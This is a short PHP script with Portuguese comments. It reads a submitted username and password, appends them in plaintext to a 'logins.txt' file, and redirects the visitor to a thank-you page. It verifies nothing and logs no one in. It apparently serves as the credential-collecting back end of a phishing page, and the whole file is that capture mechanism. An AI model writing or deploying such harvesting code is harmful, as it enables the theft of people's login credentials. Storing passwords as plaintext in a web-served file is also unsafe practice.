<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $username = $_POST['username'];
    $password = $_POST['password'];

    // Formatar os dados para salvar no arquivo
    $data = "Usuário: $username | Senha: $password\n";

    // Salvar os dados no arquivo "logins.txt"
    file_put_contents('logins.txt', $data, FILE_APPEND);

    // Redirecionar para outra página após salvar
    header('Location: obrigado.html');
    exit();
}
?>